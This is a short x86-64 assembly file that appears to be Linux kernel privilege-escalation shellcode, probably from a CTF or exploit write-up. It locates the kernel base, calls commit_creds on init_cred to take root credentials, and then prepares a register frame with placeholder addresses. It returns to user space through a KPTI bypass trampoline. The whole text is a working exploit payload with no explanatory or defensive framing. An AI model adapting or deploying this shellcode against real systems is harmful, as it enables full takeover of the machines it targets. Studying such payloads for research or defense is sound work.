BITS 64
  commit_creds  equ 0x1097210
  init_cred     equ 0x1e39080
  ; kpti_bypass   equ 0x180021c
  kpti_bypass   equ 0x18001af

_start:
  endbr64
  call a
a:
  pop r15
  sub r15, 0x11bbe19

  ; commit_creds(prepare_kernel_cred(NULL));
  lea rdi, [r15 + init_cred]
  lea rax, [r15 + commit_creds]
  call rax

  ; kpti trampoline [9]
  xor eax, eax
  mov [rsp+0x00], rax ; r15
  mov [rsp+0x08], rax ; r14
  mov [rsp+0x10], rax ; r13
  mov [rsp+0x18], rax ; r12
  mov [rsp+0x20], rax ; rbp
  mov [rsp+0x28], rax ; rbx
  mov [rsp+0x38], rax ; r10
  mov [rsp+0x40], rax ; r9
  mov [rsp+0x48], rax ; r8
  mov [rsp+0x50], rax ; rax
  mov [rsp+0x60], rax ; rdx
  mov [rsp+0x68], rax ; rsi
  mov [rsp+0x70], rax ; rdi

  mov rax, 0x2222222222222222   ; win
  mov [rsp+0x58], rax ; rcx (ret)

  mov rax, 0x4444444444444444   ; rflags
  mov [rsp+0x30], rax ; r11 (rflags)


  mov rax, 0x5555555555555555   ; stack
  mov [rsp+0x98], rax ; rsp

  lea rax, [r15 + kpti_bypass]
  jmp rax

  int3
